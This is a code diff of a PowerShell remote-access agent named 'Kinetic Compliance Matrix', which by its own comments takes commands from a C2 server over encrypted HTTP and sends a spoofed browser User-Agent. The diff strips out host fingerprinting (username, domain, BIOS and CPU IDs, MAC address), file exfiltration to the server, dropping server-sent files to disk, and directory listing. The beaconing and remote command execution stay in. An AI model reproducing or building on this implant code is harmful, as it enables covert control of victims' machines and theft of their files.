@@ -1,5 +1,4 @@
-# Kinetic Compliance Matrix - PowerShell Agent with Dynamic Path Rotation
-# This agent uses a secure key exchange mechanism and supports path rotation
+# Kinetic Compliance Matrix - Simplified PowerShell Agent
 
 # Set TLS 1.2 for compatibility
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -10,8 +9,6 @@ $serverAddress = '{{SERVER_ADDRESS}}'
 # Initial endpoint paths
 $beaconPath = '{{BEACON_PATH}}'
 $commandResultPath = '{{CMD_RESULT_PATH}}'
-$fileUploadPath = '{{FILE_UPLOAD_PATH}}'
-$fileRequestPath = '{{FILE_REQUEST_PATH}}'
 
 # Initialize encryption key as null - will be obtained from server
 $global:encryptionKey = $null
@@ -132,16 +129,16 @@ function Update-EncryptionKey {
     }
 }
 
-# Function to gather system identification information
+# Function to gather simplified system identification information
 function Get-SystemIdentification {
-    # Gather system identification information
+    # Gather only hostname and IP
     $systemInfo = @{
         Hostname = [System.Net.Dns]::GetHostName()
-        Username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-        OsVersion = [System.Environment]::OSVersion.VersionString
-        Architecture = if ([System.Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
-        ProcessorCount = [System.Environment]::ProcessorCount
-        TotalMemory = (Get-CimInstance -Class Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB
+        IP = try {
+            (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" } | Select-Object -First 1).IPAddress
+        } catch {
+            "Unknown"
+        }
     }
     
     # Generate a unique client identifier (will persist across sessions)
@@ -149,79 +146,20 @@ function Get-SystemIdentification {
         # Use existing client ID if we have one
         $systemInfo.ClientId = $global:clientId
     } else {
-        # Generate a new unique identifier
+        # Generate a new unique identifier based on hostname
         $machineId = [Guid]::NewGuid().ToString()
-    
-        # Get Machine GUID - this is a relatively stable identifier
-        try {
-            $machineGuid = (Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Cryptography" -Name "MachineGuid" -ErrorAction Stop).MachineGuid
-            $systemInfo.MachineGuid = $machineGuid
-            
-            # Use Machine GUID as the basis for client ID if available
-            $machineId = $machineGuid
-        } catch {
-            $systemInfo.MachineGuid = "Unknown"
-        }
         
         # Create a stable client ID using machine-specific information
         $computerName = $systemInfo.Hostname
-        $userName = $systemInfo.Username
         
-        # Get BIOS and CPU information if available
-        try {
-            $bios = Get-CimInstance -Class Win32_BIOS -ErrorAction SilentlyContinue
-            $systemInfo.BiosSerial = $bios.SerialNumber
-            $biosId = $bios.SerialNumber
-        } catch {
-            $systemInfo.BiosSerial = "Unknown"
-            $biosId = "Unknown"
-        }
-        
-        try {
-            $cpu = Get-CimInstance -Class Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
-            $systemInfo.CpuId = $cpu.ProcessorId
-            $cpuId = $cpu.ProcessorId
-        } catch {
-            $systemInfo.CpuId = "Unknown"
-            $cpuId = "Unknown"
-        }
-        
-        # If we don't have the Machine GUID, create a composite identifier
-        if ($machineId -eq "Unknown" -or $machineId -eq $null) {
-            # Create a composite string from hardware identifiers
-            $idString = "$computerName|$userName|$biosId|$cpuId"
-            
-            # Hash it for a stable ID
-            $shaHash = [System.Security.Cryptography.SHA256]::Create()
-            $hashBytes = $shaHash.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($idString))
-            $machineId = [System.BitConverter]::ToString($hashBytes).Replace("-", "").Substring(0, 32)
-        }
+        # Hash it for a stable ID
+        $shaHash = [System.Security.Cryptography.SHA256]::Create()
+        $hashBytes = $shaHash.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($computerName))
+        $machineId = [System.BitConverter]::ToString($hashBytes).Replace("-", "").Substring(0, 32)
         
         # Store and return the client ID
         $global:clientId = $machineId
         $systemInfo.ClientId = $machineId
-    }
-    
-    # Get MAC address of first network adapter
-    try {
-        $networkAdapters = Get-CimInstance Win32_NetworkAdapterConfiguration -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -ne $null }
-        if ($networkAdapters) {
-            $systemInfo.MacAddress = $networkAdapters[0].MACAddress
-        } else {
-            $systemInfo.MacAddress = "Unknown"
-        }
-    } catch {
-        $systemInfo.MacAddress = "Unknown"
-    }
-    
-    # Get domain information
-    try {
-        $computerSystem = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
-        $systemInfo.Domain = $computerSystem.Domain
-        $systemInfo.PartOfDomain = $computerSystem.PartOfDomain
-    } catch {
-        $systemInfo.Domain = "Unknown"
-        $systemInfo.PartOfDomain = $false
     }
     
     # Add rotation information if enabled
@@ -232,162 +170,6 @@ function Get-SystemIdentification {
     # Convert to JSON
     $jsonInfo = ConvertTo-Json -InputObject $systemInfo -Compress
     return $jsonInfo
-}
-
-# Function to download a file from client to server
-function Download-FileToServer {
-    param([string]$FilePath)
-    
-    Write-Host "Attempting to download file: $FilePath"
-    
-    if (-not (Test-Path -Path $FilePath)) {
-        return "Error: File not found - $FilePath"
-    }
-    
-    try {
-        # Get file info
-        $fileName = Split-Path -Path $FilePath -Leaf
-        $fileSize = (Get-Item $FilePath).Length
-        
-        # Read file as bytes and encode as Base64
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        $fileContent = [System.Convert]::ToBase64String($fileBytes)
-        
-        # Create file info object
-        $fileInfo = @{
-            FileName = $fileName
-            FileSize = $fileSize
-            FilePath = $FilePath
-            FileContent = $fileContent
-        }
-        
-        # Convert to JSON
-        $fileInfoJson = ConvertTo-Json -InputObject $fileInfo -Compress
-        
-        # Encrypt the file data
-        $encryptedFileData = Encrypt-Data -PlainText $fileInfoJson
-        
-        # Get current file upload path
-        $uploadPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "file_upload_path" } else { $fileUploadPath }
-        $uploadUrl = "http://$serverAddress$uploadPath"
-        
-        # Create a web client
-        $uploadClient = New-Object System.Net.WebClient
-        $systemInfo = Get-SystemIdentification
-        $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
-        $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
-        
-        # Add headers
-        $uploadClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
-        $uploadClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
-        if ($global:pathRotationEnabled) {
-            $uploadClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
-        }
-        $uploadClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
-        $uploadClient.Headers.Add("Content-Type", "application/json")
-        
-        # Upload the file
-        $uploadClient.UploadString($uploadUrl, $encryptedFileData)
-        
-        # Return success message
-        return "$fileSize bytes from $FilePath uploaded to server successfully"
-    }
-    catch {
-        return "Error uploading file: $_"
-    }
-}
-
-# Function to upload a file from server to client
-function Upload-FileFromServer {
-    param(
-        [string]$ServerFilePath,
-        [string]$ClientDestination
-    )
-    
-    Write-Host "Attempting to download file from server: $ServerFilePath to $ClientDestination"
-    
-    try {
-        # Expand environment variables in destination path
-        $expandedDestination = [System.Environment]::ExpandEnvironmentVariables($ClientDestination)
-        
-        # Create the destination directory if it doesn't exist
-        $destinationDir = Split-Path -Path $expandedDestination -Parent
-        if (-not (Test-Path -Path $destinationDir)) {
-            New-Item -Path $destinationDir -ItemType Directory -Force | Out-Null
-        }
-        
-        # Send request to server to get the file
-        $fileRequestObj = @{
-            FilePath = $ServerFilePath
-            Destination = $expandedDestination
-        }
-        
-        $fileRequestJson = ConvertTo-Json -InputObject $fileRequestObj -Compress
-        $encryptedRequest = Encrypt-Data -PlainText $fileRequestJson
-        
-        # Get current file request path
-        $fileRequestPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "file_request_path" } else { $fileRequestPath }
-        $fileRequestUrl = "http://$serverAddress$fileRequestPath"
-        
-        # Create a web client
-        $requestClient = New-Object System.Net.WebClient
-        $systemInfo = Get-SystemIdentification
-        $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
-        $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
-        
-        # Add headers
-        $requestClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
-        $requestClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
-        if ($global:pathRotationEnabled) {
-            $requestClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
-        }
-        $requestClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
-        $requestClient.Headers.Add("Content-Type", "application/json")
-        
-        # Send the request and get the response
-        $encryptedResponse = $requestClient.UploadString($fileRequestUrl, $encryptedRequest)
-        $decryptedResponse = Decrypt-Data -EncryptedBase64 $encryptedResponse
-        
-        # Parse the response
-        $fileResponse = ConvertFrom-Json -InputObject $decryptedResponse
-        
-        if ($fileResponse.Status -eq "Error") {
-            return "Error from server: $($fileResponse.Message)"
-        }
-        
-        # Decode the file content
-        $fileBytes = [System.Convert]::FromBase64String($fileResponse.FileContent)
-        
-        # Save the file to destination
-        [System.IO.File]::WriteAllBytes($expandedDestination, $fileBytes)
-        
-        # Return success message
-        return "File downloaded from server to $expandedDestination ($([Math]::Round($fileBytes.Length / 1KB, 2)) KB)"
-    }
-    catch {
-        return "Error downloading file from server: $_"
-    }
-}
-
-# Function to list directory contents
-function Get-DirectoryListing {
-    param([string]$DirectoryPath)
-    
-    try {
-        # Expand environment variables in path
-        $expandedPath = [System.Environment]::ExpandEnvironmentVariables($DirectoryPath)
-        
-        # Get directory contents
-        $items = Get-ChildItem -Path $expandedPath -ErrorAction Stop | Select-Object Name, Length, LastWriteTime, Attributes, @{Name="Type";Expression={if($_.PSIsContainer){"Directory"}else{"File"}}}
-        
-        # Convert to JSON
-        $jsonItems = ConvertTo-Json -InputObject $items -Compress
-        
-        return $jsonItems
-    }
-    catch {
-        return "Error listing directory: $_"
-    }
 }
 
 # Function to process commands from the C2 server
@@ -490,49 +272,6 @@ function Process-Commands {
                     $result = "Error executing command: $_"
                     Write-Host $result
                 }
-            }
-            elseif ($commandType -eq "upload") {
-                # Upload file from client to server
-                if (Test-Path -Path $args) {
-                    $result = Download-FileToServer -FilePath $args
-                } else {
-                    $result = "Error: File not found - $args"
-                }
-            }
-            elseif ($commandType -eq "download") {
-                # Download file from client to server
-                $result = Download-FileToServer -FilePath $args
-            }
-            elseif ($commandType -eq "file_upload") {
-                # Upload file from server to client (format: "Upload-File 'LocalPath' 'RemotePath'")
-                try {
-                    # Parse the arguments
-                    if ($args -match "Upload-File '(.*?)' '(.*?)'") {
-                        $serverPath = $matches[1]
-                        $clientPath = $matches[2]
-                        $result = Upload-FileFromServer -ServerFilePath $serverPath -ClientDestination $clientPath
-                    }
-                    else {
-                        # Try alternate parsing method if regex fails
-                        $argParts = $args -split "' '"
-                        if ($argParts.Count -ge 2) {
-                            $serverPath = $argParts[0].Replace("Upload-File '", "").Trim()
-                            $clientPath = $argParts[1].TrimEnd("'").Trim()
-                            $result = Upload-FileFromServer -ServerFilePath $serverPath -ClientDestination $clientPath
-                        }
-                        else {
-                            $result = "Error: Invalid file_upload command format: $args"
-                        }
-                    }
-                }
-                catch {
-                    $result = "Error processing file_upload command: $_"
-                }
-            }
-            elseif ($commandType -eq "system_info") {
-                # Return detailed system information
-                $detailedInfo = Get-SystemIdentification
-                $result = $detailedInfo
             }
             elseif ($commandType -eq "path_rotation") {
                 # Handle path rotation command
